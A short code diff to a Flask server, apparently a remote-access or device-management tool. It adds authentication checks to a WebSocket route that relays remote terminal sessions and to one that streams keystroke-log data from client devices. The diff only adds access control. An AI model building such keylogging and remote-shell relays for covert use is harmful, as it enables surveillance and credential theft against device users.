@@ -12,6 +12,7 @@ import threading
 
 from flask import jsonify, request
 from common.protocol import MsgType, make_msg
+from server.auth import require_ws_auth
 
 logger = logging.getLogger(__name__)
 
@@ -252,6 +253,9 @@ def register_remote_routes(app, sock, cm):
         Web 端发送的输入转发到客户端的 TERMINAL handler，
         客户端的 TERMINAL_DATA 输出转发回 Web 端。
         """
+        if not require_ws_auth(ws):
+            return
+
         device = cm.get_device(client_id)
         if not device or not device.online:
             ws.close()
@@ -318,6 +322,9 @@ def register_remote_routes(app, sock, cm):
     @sock.route('/api/devices/<client_id>/keylog/ws')
     def keylog_proxy_ws(ws, client_id):
         """按键记录 WebSocket 代理：客户端的 KEYLOG_DATA 事件转发到 Web 端。"""
+        if not require_ws_auth(ws):
+            return
+
         device = cm.get_device(client_id)
         if not device or not device.online:
             ws.close()
